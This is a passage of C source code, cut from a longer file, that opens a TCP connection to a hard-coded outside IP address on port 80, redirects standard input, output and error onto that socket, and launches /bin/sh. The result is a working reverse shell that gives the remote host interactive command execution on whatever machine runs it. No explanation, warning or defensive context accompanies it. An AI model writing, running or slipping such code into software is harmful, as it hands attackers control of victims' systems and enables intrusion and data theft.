
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(80);          
    inet_pton(AF_INET, "20.74.81.63", &server_addr.sin_addr);  

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect failed");
        return 1;
    }

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execl("/bin/sh", "sh", NULL);

    return 0;
}
